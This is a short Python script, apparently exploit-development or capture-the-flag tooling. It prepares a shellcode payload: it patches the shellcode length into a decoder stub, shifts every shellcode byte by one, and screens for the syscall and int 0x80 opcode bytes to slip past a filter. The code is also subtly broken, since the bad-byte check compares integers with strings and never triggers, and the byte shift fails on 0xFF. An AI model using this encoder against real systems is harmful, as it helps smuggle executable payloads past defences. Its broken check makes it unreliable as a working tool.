payload = ''

decoder_bytes = open("./decoder", "rb").read()
shellcode_bytes = open("./shellcode", "rb").read()

print(f"[+] Decoder len: {len(decoder_bytes)}")
print(f"[+] Shellcode len: {len(shellcode_bytes)}")
decoder_bytes = list(decoder_bytes)
decoder_bytes[0xF] = len(shellcode_bytes)
decoder_bytes = bytes(decoder_bytes)
print("[+] Injected shellcode len")

new_shellcode = [b + 1 for b in shellcode_bytes]
shellcode_bytes = bytes(new_shellcode)

payload = decoder_bytes + shellcode_bytes

if any([x in ["00", "cd", "80", "0f", "05"] for x in payload]):
    print("Not allowed bytes")
else:
    print(payload)
    with open("prepared.bin", "wb") as f:
        f.write(payload)
